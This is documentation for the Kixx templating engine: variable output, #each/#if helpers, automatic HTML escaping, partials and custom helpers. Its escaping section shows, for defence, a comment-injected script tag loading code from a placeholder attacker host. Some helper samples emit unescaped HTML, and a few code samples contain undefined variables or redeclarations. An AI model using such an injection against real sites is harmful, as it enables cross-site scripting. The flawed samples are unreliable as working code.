Templating with Kixx
====================

Basic Expressions
-----------------
The most fundamental syntax element is the expression, which allows you to output values from your context.

Kixx templating uses mustache style syntax with double curly braces `{{ ... }}` for template expressions.

### Simple Variable Output
Context data:
```js
response.updateProps({
    album: 'Follow the Leader',
    artist: 'Eric B. & Rakim',
});
```

HTML template:
```html
<h1>{{ album }}</h1>
<p>by {{ artist }}</p>
```

HTML output:
```html
<h1>Follow the Leader</h1>
<p>by Eric B. &amp; Rakim</p>
```

Notice that the "&" was converted to an HTML entity: `&amp;`. This is because HTML escaping is done automatically by the Kixx templating system as a security feature to avoid [HTML injection attacks](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection). To learn more, see the section in this document on [HTML Escaping](#html-escaping).

### Stringification
Kixx templates will attempt to convert the value you reference to a string before rendering, which can lead to some unexpected results you should be aware of.

Context data:
```js
response.updateProps({
    song: {
        writer: { firstName: 'Bob', lastName: 'Dylan' },
        released: new Date('1963-08-13'),
        sales: 470000,
    },
});
```

HTML template:
```html
<p>Writer: {{ song.writer }}</p>
<p>Released: {{ song.released }}</p>
<p>Sales: {{ song.sales }}</p>
```

HTML output:
```html
<p>Writer: [object Object]</p>
<p>Released: Mon Aug 12 1963 20:00:00 GMT-0400 (Eastern Daylight Time)</p>
<p>Sales: 470000</p>
```
That's probably not what you wanted 😉

To avoid the "[object Object]" problem, see the section on [Nested Property Access](#nested-property-access) below.

Use the [formatDate helper](#formatdate-helper) to render the Date object with the appropriate time zone, locale, and formatting.

### Nested Property Access
Let's try the example above again, this time using dot "." notation for nested property access:
```html
<p>Writer {{ song.writer.firstName }} {{ song.writer.lastName }}</p>
```

This is better:
```html
<p>Writer: Bob Dylan</p>
```

### Array Access
You can also access array elements using the common square bracket "[]" notation.

```js
response.updateProps({
    images: [
        {
            src: 'https://www.example.com/assets/image-1.jpg',
            alt: 'A mongoose',
            tags: [ 'Mammel', 'Mongoose' ],
        },
        {
            src: 'https://www.example.com/assets/image-2.jpg',
            alt: 'An elephant',
            tags: [ 'Mammel', 'Elepant' ],
        },
    ],
});
```

HTML template:
```html
<ul>
    <li>
        <img src="{{ images[0].src }}" alt="{{ images[0].alt }}" />
        <span>{{ images[0].tags[0] }}</span><span>{{ images[0].tags[1] }}</span>
    </li>
    <li>
        <img src="{{ images[1].src }}" alt="{{ images[1].alt }}" />
        <span>{{ images[1].tags[0] }}</span><span>{{ images[1].tags[1] }}</span>
    </li>
</ul>
```
Writing out each array element access is cumbersome and fragile, so in most cases you'll want to use an `#each` loop to iterate over arrays. But, there may be cases where you need to access array elements individually, so Kixx templating allows you to do that with the sqaure bracket "[]" notation.

See the section in this document on the [#each block helper](#each-helper) to see how to iterate over an array, Map, Set, or object.

### Quoted Property Access
Some JavaScript properties need to be quoted because they contain illegal characters like `Content-Type` and `Content-Langth` in this example:
```js
response.updateProps({
    headers: {
        Date: "Thu, 23 Oct 2025 17:07:22 GMT",
        "Content-Type": "text/html",
        "Content-Length": 199,
    },
});
```

These properties will need to be accessed using the square bracket "[]" notation in your template:
```html
<dl>
    <dt>Date</dt>
    <dd>{{ headers.Date }}</dd>
    <dt>Content-Type</dt>
    <dd>{{ headers[Content-Type] }}</dd>
    <dt>Content-Length</dt>
    <dd>{{ headers[Content-Length] }}</dd>
</dl>
```

⚠️ __Note:__ You do *not* need quotes inside the brackets `["Content-Type"]` like you would in JavaScript. Instead, just reference the value without quotes like `[Content-Type]`.

### Comments
Template comments don't appear in the rendered output and are useful for documentation, debugging, and temporarily disabling sections of your template.

A single line comment:
```html
{{!-- This is a single line comment --}}
<h1>{{ title }}</h1>
```

A multi-line comment including disabled template syntax:
```html
{{!-- 
    This is a multi-line comment.
    You can include mustaches here: {{ title }}
    And they won't be processed.
--}}
<div class="content">
    {{ content }}
</div>
```

Built-in Helpers
----------------
Kixx comes with a set of essential helper functions that cover common use cases. Block helpers begin with `#` to distinguish them from inline helpers.

| Helper | Type | Description |
|--------|------|-------------|
| `#each` | Block | Iterate over arrays, objects, Maps, and Sets |
| `#if` | Block | Conditional rendering based on truthiness |
| `#ifEqual` | Block | Equality comparison using `==` |
| `formatDate` | Inline | Format JavaScript dates and date strings |
| `unescape` | Inline | Prevent automatic HTML encoding |
| `plusOne` | Inline | Add 1 to the given number for rendering array indexes |

### Helper Arguments
Helpers can accept different types of arguments:

Positional arguments with a reference to `article.date` as well as 3 literal strings: "long", "America/New_York", and "en-US".
```html
{{customFormatDate article.date "long" "America/New_York" locale="en-US"}}
```

Named arguments with a positional reference to `article.date` and named reference to `article.timezone`.
```html
{{customFormatDate date=article.date format="long" timezone=article.timezone locale="en-US" }}
```

Mixed positional and named arguments including a reference to `article.image`, literal numbers, and literal strings.

⚠️ Note that positional arguments must be written first, in front of named arguments.
```html
{{ image article.image 800 600 quality="high" format="webp" }}
```

### each Helper
The `#each` block helper allows you to conveniently iterate over iterable objects like arrays and maps.

Context data:
```js
response.updateProps({
    images: [
        {
            src: 'https://www.example.com/assets/image-1.jpg',
            alt: 'A mongoose',
            tags: [ 'Mammel', 'Mongoose' ],
        },
        {
            src: 'https://www.example.com/assets/image-2.jpg',
            alt: 'An elephant',
            tags: [ 'Mammel', 'Elepant' ],
        },
    ],
});
```

A single `#each` loop. ⚠️ __Remember__ to include the closing `{{/each}}` tag.
```html
<ul>
    {{#each images as |image| }}
    <li>
        <img src="{{ image.src }}" alt="{{ image.alt }}" />
    </li>
    {{/each}}
</ul>
```

You can use the second parameter to `#each` to reference the array index, Map key, or object property name. Use the [plusOne helper](#plusone-helper) to make array indexes more useful.
```html
<ul>
    {{#each images as |image, index| }}
    <li>
        <span>{{plusOne index }}</span>
        <img src="{{ image.src }}" alt="{{ image.alt }}" />
    </li>
    {{/each}}
</ul>
```

You can nest `#each` blocks too. Here we have an `#each` block that iterates over the image tags inside the `#each` block for the images.
```html
<ul>
    {{#each images as |image| }}
    <li>
        <img src="{{ image.src }}" alt="{{ image.alt }}" />
        {{#each image.tags as |tag| }}<span>{{ tag }}</span>{{/each}}
    </li>
    {{/each}}
</ul>
```

And, you can use the `else` conditional to handle empty lists:
```js
response.updateProps({ images: [] });
```

Using `else` you can render different markup for a better user experience rather than rendering nothing at all:
```html
{{#each images as |image| }}
    <div>
        <img src="{{ image.src }}" alt="{{ image.alt }}" />
    </div>
{{else}}
    <p>No images to display</p>
{{/each}}
```

Expressions inside the `#each` block can reference context data outside the block.
```js
response.updateProps({
    photo: {
        src: 'https://www.example.com/assets/image-1.jpg',
        alt: 'A dog chasing a cat',
        tags: [ 'dog', 'cat', 'pets' ],
    },
});
```

Here we access the `photo.src` from inside the `photo.tags` `#each` block.
```html
{{#each photo.tags as |tag|}}
    <div>
        <img src="{{ photo.src }}">
        <p>{{ tag }}</p>
    </div>
{{/each}}
```

The `#each` helper can be used to iterate over Arrays, Maps, Sets, and plain objects:
```js
const airports = new Map();

airports.set('ATL', {
    name: 'Hartsfield-Jackson Atlanta International Airport',
    yearlyPassengersMillions: 108.1,
});

airports.set('DXB', {
    name: 'Dubai International Airport',
    yearlyPassengersMillions: 93.3,
});

airports.set('DFW', {
    name: 'Dallas/Fort Worth International Airport',
    yearlyPassengersMillions: 87.8,
});

response.updateProps({
    airports,
    tags: new Set([ 'airports', 'traffic', 'passengers' ]),
    headers: {
        Date: "Thu, 23 Oct 2025 17:07:22 GMT",
        "Content-Type": "text/html",
        "Content-Length": 199,
    },
});
```

#### The second "key name" parameter to `#each`
The `#each` helper accepts a second parameter which references something slightly different based on the iterable object type.

| Iterable | Second parameter description |
|----------|------------------------------|
| Array    | references the index |
| Map      | references the key |
| Set      | no reference |
| plain Object | references the property name |

HTML template:
```html
{{!--
    When iterating over a Map you can use the second parameter to
    #each to reference the key --}}
{{#each airports as |airport, code| }}
    <div>
        <p>{{ code }} | {{ airport.name }}</p>
        <p>Yearly Passengers (millions): {{ airport.yearlyPassengersMillions }}</p>
    </div>
{{else}}
    {{!-- Handle the case where there are no airports --}}
    <div>
        <p>No airports to list.</p>
    </div>
{{/each}}

{{!--
    When iterating over a Set the second parameter to
    #each is not defined --}}
<p>
{{#each tags as |tag|}}
    <span>{{ tag }}</span>
{{/each}}
</p>

<ul>
{{!--
    When iterating over an object you can use the second parameter to
    #each to reference the property name --}}
{{#each headers as |val, key|}}
    <li><strong>key:</strong> {{ val }}</li>
{{/each}}
</ul>
```

### if Helper
The `#if` helper provides conditional rendering based on the truthiness of a value. ⚠️ __Remember__ to include the closing `{{/if}}` tag.

```html
{{#if user.isLoggedIn}}
    <p>Welcome back, {{ user.name }}!</p>
{{else}}
    <p>Please <a href="/login">log in</a>.</p>
{{/if}}
```

#### Truthiness rules for `if` blocks
The `#if` helper considers these values as **truthy**:

- Any non-empty string
- Any non-zero number
- `true`
- Non-empty arrays
- Non-empty objects
- Non-empty Maps and Sets

These values are considered **falsy**:

- `false`
- `0`
- `""` (empty string)
- `null`
- `undefined`
- Empty arrays `[]`
- Empty objects `{}`
- Empty Maps and Sets

The `#if` helper can be helpful to avoid rendering tags if a value is empty:
```html
{{#if openGraph.type }}
    <meta property="og:type" content="{{ openGraph.type }}">
{{/if}}
{{#if openGraph.url }}
    <meta property="og:url" content="{{ openGraph.url }}">
{{/if}}
```

You can also check if an array (or other iterable) is empty before iterating over it to avoid rendering the outer HTML. In this list, we don't want to render the `<ul></ul>` if the `profile.links` is empty.
```html
{{#if profile.links }}
<ul>
    {{#each profile.links as |link|}}
    <li><a href="{{ link.href }}">{{ link.label }}</a></li>
    {{/each}}
</ul>
{{/if}}
```

### ifEqual Helper
The `#ifEqual` helper compares two values using `==` equality and conditionally renders content. ⚠️ __Remember__ to include matching closing `{{/if}}` tags.

```html
{{#ifEqual user.role "admin"}}
    <span class="admin-badge">Administrator</span>
{{else}}
    <span class="user-badge">User</span>
{{/ifEqual}}
```

The `#ifEqual` helper can work as an `if ... else if ... ` chain or even as a `switch ... case` statement:
```html
{{#ifEqual user.role "admin"}}
    <a href="/dashboard/admin">Administrator</a>
{{else}}{{#ifEqual user.role "moderator"}}
    <a href="/dashboard/mod">Moderator</a>
{{else}}
    <a href="/dashboard">Dashboard</a>
{{/ifEqual}}{{/ifEqual}}
```

### formatDate Helper
The `formatDate` helper is an inline helper which formats and renders date strings and objects with time zone and locale context.

```js
response.updateProps({
    game: {
        timezone: 'America/New_York',
        startTime: '2025-10-24T23:00:00.000Z',
        endTime: '2025-10-25T02:00:00.000Z',
    },
});
```

You can explicitly set the time zone, locale, and format or use the defaults for any of them.

| Attribute | Default | Description |
|-----------|---------|-------------|
| zone      | system default | Usually UTC for most servers |
| locale    | system locale | Usually en-US for most servers |
| format    | DATETIME_SHORT | Outputs "10/14/1983, 1:30 PM" |

```html
{{!-- Explicitly set the time zone, locale, and format --}}
<p>Game start: {{formatDate game.startTime zone="America/New_York" locale="en-US" format="DATETIME_MED" }}</p>

{{!-- Use the default time zone, locale, and format --}}
<p>Game end: {{formatDate game.startTime }}</p>
```

Formatted output:
```html
<p>Game start: Oct 24, 2025, 7:00 PM</p>
<p>Game end: 10/25/2025, 2:00 AM</p>
```

All helper mustaches can span multiple lines, but splitting a long `formatDate` helper expression when all the attributes are explicitly set can be particularly helpful:
```html
<p>Game start: {{formatDate game.startTime
    zone="America/New_York"
    locale="en-US"
    format="DATETIME_MED"
}}</p>
```
⚠️ __Note__ in the game `endTime`, since we didn't provide a time zone, the system used the default UTC time of 2:00AM the next day, which is probaby not what we wanted. It's better to be safe and explicitly set the `zone` attribute.

For a list of common IANA time zone strings, see the [Wikipedia page](https://en.wikipedia.org/wiki/List_of_tz_database_time_zones).

The full list of locale language strings can be found in the [IANA registry](https://www.iana.org/assignments/language-subtag-registry/language-subtag-registry) or the [language tag registry search](https://r12a.github.io/app-subtags/).

#### Formats for formatDate

| Name                            | Example format output in en_US                   |
|---------------------------------|--------------------------------------------------|
| DATE_SHORT                      | 10/14/1983                                       |
| DATE_MED                        | Oct 14, 1983                                     |
| DATE_MED_WITH_WEEKDAY           | Fri, Oct 14, 1983                                |
| DATE_FULL                       | October 14, 1983                                 |
| DATE_HUGE                       | Friday, October 14, 1983                         |
| TIME_SIMPLE                     | 1:30 PM                                          |
| TIME_WITH_SECONDS               | 1:30:23 PM                                       |
| TIME_WITH_SHORT_OFFSET          | 1:30:23 PM EDT                                   |
| TIME_WITH_LONG_OFFSET           | 1:30:23 PM Eastern Daylight Time                 |
| TIME_24_SIMPLE                  | 13:30                                            |
| TIME_24_WITH_SECONDS            | 13:30:23                                         |
| TIME_24_WITH_SHORT_OFFSET       | 13:30:23 EDT                                     |
| TIME_24_WITH_LONG_OFFSET        | 13:30:23 Eastern Daylight Time                   |
| DATETIME_SHORT                  | 10/14/1983, 1:30 PM                              |
| DATETIME_MED                    | Oct 14, 1983, 1:30 PM                            |
| DATETIME_MED_WITH_WEEKDAY       | Fri, Oct 14, 1983, 1:30 PM                       |
| DATETIME_FULL                   | October 14, 1983 at 1:30 PM EDT                  |
| DATETIME_HUGE                   | Friday, October 14, 1983 at 1:30 PM Eastern Daylight Time |
| DATETIME_SHORT_WITH_SECONDS     | 10/14/1983, 1:30:23 PM                           |
| DATETIME_MED_WITH_SECONDS       | Oct 14, 1983, 1:30:23 PM                         |
| DATETIME_FULL_WITH_SECONDS      | October 14, 1983 at 1:30:23 PM EDT               |
| DATETIME_HUGE_WITH_SECONDS      | Friday, October 14, 1983 at 1:30:23 PM Eastern Daylight Time |
| UTC                             | Wed, 14 Jun 2017 07:00:00 GMT                    |
| ISO                             | 2017-06-14T07:00:00.000Z                         |
| ISO_DATE                        | 2017-06-14                                       |

### plusOne Helper
The `plusOne` helper simply adds 1 to the given number. This is useful for using array indexes in the rendered output.

HTML template:
```html
{{#each images as |image, index| }}
<div>
    <span>{{plusOne index }}.</span> <img src="{{ image.src }}" alt="{{ image.alt }}" />
</div>
{{/each}}
```

### Multi-line Helpers
All helper mustaches can span multiple lines, but this technique can be especially useful for potentially long ones like `formatDate` when all the attributes are explicitly set:
```html
<p>Game start: {{formatDate game.startTime
    zone="America/New_York"
    locale="en-US"
    format="DATETIME_MED"
}}</p>
```

HTML Escaping
-------------
Kixx templating automatically escapes HTML as a security feature to avoid [HTML injection attacks](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection).

Imagine a bad guy writes a comment on our blog which injects his evil script. Then we render the comment on our blog with this template:
```html
{{#each post.comments as |comment|}}
<div>
    {{ comment }}
</div>
{{/each}}
```

It might render something like this. Notice the evil script tag the attacker injected:
```html
<div>
    A good comment.
</div>
<div>
    A bad attack: <script src="http://evildoer.evil/evil-script.js" />
</div>
<div>
    Another good comment.
</div>
```
That script tag will load a script which could do anything on our page ranging from mildly annoying to much, much worse.

To help avoid these cross site scripting attacks Kixx templating escapes HTML by default. Instead of the script being injected like the example above, what actually happens is that the dangerous HTML is escaped like this:
```html
<div>
    A good comment.
</div>
<div>
    Not so bad: &lt;script src&#x3D;&quot;http://evildoer.evil/evil-script.js&quot; /&gt;
</div>
<div>
    Another good comment.
</div>
```

### Using the `unescape` helper to prevent automatic escaping
There are times when you want to prevent the automatic HTML escaping. One example might be for markdown content you've converted to HTML and want to render on the page. To prevent HTML escaping, use the built-in `unescape` helper:

```html
<p>{{unescape markdownContent }}</p>
```

**⚠️ Security Warning:** Only use `unescape` when you trust the content and want to render HTML. Never use it with untrusted user input.

### Escaping HTML from custom helpers
Be sure to also escape any untrusted content from inside custom helper functions you define. See the section on [Custom Helpers](#custom-helpers) for more information.

```javascript
import { escapeHTMLChars } from 'kixx';

function helperName(context, options, ...positionals) {
    // In most cases you will want to use escapeHTMLChars() to
    // avoid leaking HTML into the output.
    return escapeHTMLChars(output);
}
```

Partials
--------
Partials are reusable template components that allow you to break down large templates into smaller, manageable pieces. They help maintain consistency across your application and reduce code duplication.

Use the `{{> partial-name.html }}` syntax to include a partial:

```html
<!DOCTYPE html>
<html>
<head>
    {{> head.html }}
</head>
<body>
    {{> header.html }}
    
    <main>
        {{unescape mainContent }}
    </main>
    
    {{> footer.html }}
</body>
</html>
```

### Creating Partials
Partials are just regular template files which you create in the `./templates/partials/` directory of your project. Here's an example header partial:

```html
<!-- header.html -->
<header class="site-header">
    <nav>
        <a href="/" class="logo">{{ site.name }}</a>
        <ul class="nav-menu">
            {{#each navigation as |item|}}
                <li><a href="{{ item.url }}">{{ item.text }}</a></li>
            {{/each}}
        </ul>
    </nav>
</header>
```

### Context Inheritance in Partials
Partials automatically inherit the context from their parent template, so they have access to all the same variables.

For example, let's say we want to create a table of stats for this hockey game:
```js
response.updateProps({
    formattedName: "vs. Toronto Maple Leafs",
    startTime: "2025-10-24T23:00:00.000Z",
    players: [
        { name: "Wayne Gretzky", points: 3, goals: 1 },
        { name: "Mario Lemieux", points: 2, goals: 1 },
        { name: "Alexander Ovechkin", points: 2, goals: 2 }
    ]
});
````

Here is our page template:
```html
<h2>Player stats for the game at {{formatDate game.startTime zone="America/Los_Angeles" locale="en-US" }}</h2>
<table>
    <thead>
        <tr><th>Game</th><th>Player</th><th>Goals</th><th>Points</th></tr>
    </thead>
    <tbody>
        {{#each game.players as |player| }}
        {{> cards/game-player.html }}
        {{/each}}
    </tbody>
</table>
```

And, here is our partial at `./templates/partials/cards/game-player.html`. This partial will create a row of stats for each player as we iterate over them in the `#each` loop above. Also, notice that we can still access the `game` object as we iterate over the `cards/game-player.html` partial.
```html
<tr>
    <td>{{ game.formattedName }}</td>
    <td>{{ player.name }}</td>
    <td>{{ player.goals }}</td>
    <td>{{ player.points }}</td>
</tr>
```

The rendered output looks something like this:
```html
<h2>Game on 10/24/2025, 4:00 PM</h2>
<table>
    <thead>
        <tr><th>Game</th><th>Player</th><th>Goals</th><th>Points</th></tr>
    </thead>
    <tbody>
        <tr>
            <td>vs. Toronto Maple Leafs</td>
            <td>Wayne Gretzky</td>
            <td>1</td>
            <td>3</td>
        </tr>
        <tr>
            <td>vs. Toronto Maple Leafs</td>
            <td>Mario Lemieux</td>
            <td>1</td>
            <td>2</td>
        </tr>
        <tr>
            <td>vs. Toronto Maple Leafs</td>
            <td>Alexander Ovechkin</td>
            <td>2</td>
            <td>2</td>
        </tr>
    </tbody>
</table>
```

### Common Partial Patterns
Create a base layout that other templates can extend:

```html
<!-- layout.html -->
<!DOCTYPE html>
<html lang="{{ site.language }}">
<head>
    {{> head.html }}
</head>
<body class="{{ bodyClass }}">
    {{> header.html }}
    
    <main class="main-content">
        {{ content }}
    </main>
    
    {{> footer.html }}
    
    {{> scripts.html }}
</body>
</html>
```

Partials can include other partials, allowing you to create complex component hierarchies:

```html
<!-- article-list.html -->
<div class="article-list">
    {{#each articles as |article|}}
        {{> article-card.html }}
    {{/each}}
</div>

<!-- article-card.html -->
<article class="article-card">
    <header>
        {{> article-header.html }}
    </header>
    <div class="content">
        {{ article.excerpt }}
    </div>
    <footer>
        {{> article-footer.html }}
    </footer>
</article>

<!-- article-header.html -->
<h2><a href="{{ article.url }}">{{ article.title }}</a></h2>
{{> author-info.html }}
```

You can conditionally include partials based on context:

```html
<!-- main template -->
{{#if user.isAdmin}}
    {{> admin-panel.html }}
{{else}}
    {{> user-panel.html }}
{{/if}}

{{#if showSidebar}}
    {{> sidebar.html }}
{{/if}}
```

### Best Practices for partials

__1. Use Descriptive Names__

```html
<!-- Good -->
{{> user-profile-card.html }}
{{> navigation-menu.html }}
{{> article-meta.html }}

<!-- Avoid -->
{{> card.html }}
{{> nav.html }}
{{> meta.html }}
```

__2. Keep Partials Focused__

```html
<!-- Good: Single responsibility -->
<!-- user-avatar.html -->
<img src="{{ user.avatar }}" alt="{{ user.name }}" class="avatar" />

<!-- Avoid: Multiple responsibilities -->
<!-- user-card.html -->
<div class="user-card">
    <img src="{{ user.avatar }}" alt="{{ user.name }}" />
    <h3>{{ user.name }}</h3>
    <p>{{ user.bio }}</p>
    <div class="actions">
        <button>Edit</button>
        <button>Delete</button>
    </div>
</div>
```

__3. Use Consistent Naming Conventions__

```html
<!-- Use kebab-case for file names -->
{{> user-profile.html }}
{{> navigation-menu.html }}
{{> article-card.html }}

<!-- Use descriptive names that indicate purpose -->
{{> form-field-input.html }}
{{> form-field-textarea.html }}
{{> form-field-select.html }}
```

__4. Organize Partials by Feature__

```
templates/
└── partials/
    ├── layout/
    │   ├── base.html
    │   ├── head.html
    │   ├── header.html
    │   └── footer.html
    ├── components/
    │   ├── button.html
    │   ├── card.html
    │   └── form-field.html
    ├── user/
    │   ├── user-card.html
    │   ├── user-avatar.html
    │   └── user-profile.html
    └── article/
        ├── article-card.html
        ├── article-meta.html
        └── article-content.html
```

__5. Document Partial Dependencies__

```html
<!-- user-card.html -->
{{!-- 
    This partial expects the following context:
    - user: Object with name, email, avatar properties
    - showActions: Boolean to show/hide action buttons
--}}
<div class="user-card">
    <img src="{{ user.avatar }}" alt="{{ user.name }}" />
    <h3>{{ user.name }}</h3>
    <p>{{ user.email }}</p>
    
    {{#if showActions}}
        <div class="actions">
            <button>Edit</button>
            <button>Delete</button>
        </div>
    {{/if}}
</div>
```

Custom Helpers
--------------
Kixx Templating allows you to create custom helper functions to extend the template engine's capabilities.

There are two types of helpers you can create:

- **Inline Helpers**: Transform data and return a string value
- **Block Helpers**: Control template flow and can contain other content

All helper functions, both inline and block, follow this signature:

```javascript
import { escapeHTMLChars } from 'kixx';

export const name = 'helperName';

export function helper(context, options, ...positionals) {
    // In most cases you will want to use escapeHTMLChars() to
    // avoid leaking HTML into the output.
    return escapeHTMLChars(output);
}
```

⚠️ Avoid leaking untrusted content into your rendered HTML by using `escapeHTMLChars()`. Rendering unfiltered content can lead to [HTML injection attacks](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection). See the section on [HTML Escaping](#html-escaping) for more information.

### Inline Helpers
Inline helpers transform data and return a string value.

__Helper function parameters:__

| Parameter         | Description                                         |
|-------------------|-----------------------------------------------------|
| `context`         | The current template context object                 |
| `options`         | Named arguments (hash) passed to the helper         |
| `...positionals`  | Rest parameters representing positional arguments   |

In this example we take a date string as a positional argument as well as a named arguments for format, zone, locale, and attributes. Then we render a [`<time>` tag](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/time) while also leveraging the existing formatDate helper. This helper should be defined in `./templates/helpers/datetime.js`:
```javascript
import { templateHelpers, isNonEmptyString } from 'kixx';

export const name = 'datetime';

export function helper(context, options, dateString) {
    const format = options.format;
    // Allow the options to override the configured time zone for this page.
    const zone = options.zone || context.localTimeZone;
    // Allow the options to override the configured locale for this page.
    const locale = options.locale || context.locale;

    let attributes = {}; // Default attributes are an empty object.
    if (isNonEmptyString(options.attributes)) {
        attributes = JSON.parse(options.attributes);
    }

    // Get the value for the "datetime" attribute:
    attributes.datetime = templateHelpers.formatDate(context, {
        zone,
        format: 'ISO',
    }, dateString);

    const formattedDate = templateHelpers.formatDate(context, {
        zone,
        locale,
        format,
    }, dateString);

    const attrString = Object.keys(attributes).reduce((attrs, key) => {
        attrs += ` ${key}="${attributes[key]}"`;
        return attrs;
    }, '');

    return `<time${ attrString }>${ formattedDate }</time>`;
}
```

And then we can use our custom datetime helper in a template:
```html
<p>
    Published: {{datetime article.publishDate format="DATE_MED" attributes='{"class": "published-date"}'}}
</p>
```

**Helper with Multiple Arguments**

```javascript
export const name = 'image';

export function helper(context, options, src, alt, width, height) {
    const { class: className = '', loading = 'lazy' } = options;
    
    if (!src) return '';
    
    return `<img src="${src}" alt="${alt || ''}" width="${width || ''}" height="${height || ''}" class="${className}" loading="${loading}">`;
}
```

```html
{{image article.image.src article.image.alt 800 600 class="featured" loading="eager"}}
```

### Block Helpers
The main difference between inline helpers and block helpers is that while inline helpers transform data and output strings, block helpers render sections of content. Block helpers can have an `else` cause, which will cause a different block to be rendered based on some conditional. A standard example of a block helper is the built-in `#if` helper:

```html
{{#if user.isLoggedIn}}
    <p>Welcome back!</p>
{{else}}
    <p>Please <a href="/login">log in</a> to continue.</p>
{{/if}}
```

⚠️ __Remember__ to include the closing tag (`{{/if}}` in this example) when using block helpers.

Inside block helpers, the `this` Context provides the core functionality:

| Property/Method                       | Description                             |
|---------------------------------------|-----------------------------------------|
| `this.blockParams`                    | Array of block parameter names          |
| `this.renderPrimary(newContext)`      | Render the primary block                |
| `this.renderInverse(newContext)`      | Render the inverse (else) block         |

Here is how we would implement the `#if` block helper:
```javascript
export const name = 'if';

export function helper(context, options, condition) {
    if (condition) {
        return this.renderPrimary(context);
    }
    return this.renderInverse(context);
}
```

A simple iteration block helper with parameters:
```javascript
export const name = 'repeat';

export function helper(context, options, count) {
    const { separator = '' } = options;
    let output = '';
    
    for (let i = 0; i < count; i++) {
        const subContext = { ...context, index: i };
        output += this.renderPrimary(subContext);
        if (i < count - 1 && separator) {
            output += separator;
        }
    }
    
    return output;
}
```

```html
{{#repeat 3 separator=", "}}
    <span>Item {{ index }}</span>
{{/repeat}}
```

This is how we would implement the built-in `#each` block helper for Arrays only. Notice that we can also access `this.blockParams` which are passed in using the `|param1, param2|` syntax.
```javascript
export const name = 'each';

export function helper(context, options, list) {
    if (list === null || typeof list !== 'object') {
        return this.renderInverse(context);
    }

    const [ itemName, indexName ] = this.blockParams;

    if (!itemName) {
        throw new Error('The first block param |[itemName]| is required for the #each helper');
    }

    if (iterableObject.length === 0) {
        return this.renderInverse(context);
    }

    return iterableObject.reduce((str, item, index) => {
        const subContext = {};
        subContext[itemName] = item;
        if (indexName) {
            subContext[indexName] = index;
        }

        return str + this.renderPrimary(Object.assign({}, context, subContext));
    }, '');
}
```

```html
{{#each images as |image| }}
    <div>
        <img src="{{ image.src }}" alt="{{ image.alt }}" />
    </div>
{{else}}
    <p>No images to display</p>
{{/each}}
```

### Registering Helpers

Kixx Templating will automatically register any helper functions you define in your project's `templates/helpers` directory. Simply create a JavaScript file for each helper in that directory, and the template engine will load and register them for you.

For example, to add a custom `formatDate` helper, create a file at `templates/helpers/formatDate.js`:

### Advanced Helper Examples

**Date Formatting Helper**

```javascript
function formatDate(context, options, dateString) {
    const { 
        format = 'short', 
        timezone = 'UTC',
        locale = 'en-US' 
    } = options;
    
    if (!dateString) return '';
    
    const date = new Date(dateString);
    
    const formats = {
        short: { month: 'short', day: 'numeric', year: 'numeric' },
        long: { 
            weekday: 'long', 
            year: 'numeric', 
            month: 'long', 
            day: 'numeric' 
        },
        time: { 
            hour: '2-digit', 
            minute: '2-digit' 
        },
        datetime: { 
            year: 'numeric', 
            month: 'short', 
            day: 'numeric',
            hour: '2-digit', 
            minute: '2-digit' 
        }
    };
    
    const options = formats[format] || formats.short;
    return date.toLocaleDateString(locale, options);
}
```

**String Manipulation Helper**

```javascript
function truncate(context, options, text) {
    const { length = 100, suffix = '...' } = options;
    
    if (!text || text.length <= length) {
        return text;
    }
    
    return text.substring(0, length) + suffix;
}
```

**Conditional Class Helper**

```javascript
function conditionalClass(context, options, ...classes) {
    const classList = [];
    
    for (let i = 0; i < classes.length; i += 2) {
        const className = classes[i];
        const condition = classes[i + 1];
        
        if (condition) {
            classList.push(className);
        }
    }
    
    return classList.join(' ');
}
```

```html
<div class="{{ conditionalClass 'active' user.isActive 'admin' user.isAdmin 'verified' user.isVerified }}">
    User content
</div>
```

**Pagination Helper**

```javascript
function pagination(context, options, currentPage, totalPages) {
    const { maxVisible = 5 } = options;
    
    if (totalPages <= 1) return '';
    
    let output = '<nav class="pagination"><ul>';
    
    // Previous button
    if (currentPage > 1) {
        output += `<li><a href="?page=${currentPage - 1}">Previous</a></li>`;
    }
    
    // Page numbers
    const start = Math.max(1, currentPage - Math.floor(maxVisible / 2));
    const end = Math.min(totalPages, start + maxVisible - 1);
    
    for (let i = start; i <= end; i++) {
        if (i === currentPage) {
            output += `<li class="current"><span>${i}</span></li>`;
        } else {
            output += `<li><a href="?page=${i}">${i}</a></li>`;
        }
    }
    
    // Next button
    if (currentPage < totalPages) {
        output += `<li><a href="?page=${currentPage + 1}">Next</a></li>`;
    }
    
    output += '</ul></nav>';
    return output;
}
```

Always handle errors gracefully in your helpers:

```javascript
function safeHelper(context, options, value) {
    try {
        // Your helper logic here
        return processedValue;
    } catch (error) {
        console.error('Helper error:', error);
        return ''; // Return empty string on error
    }
}
```
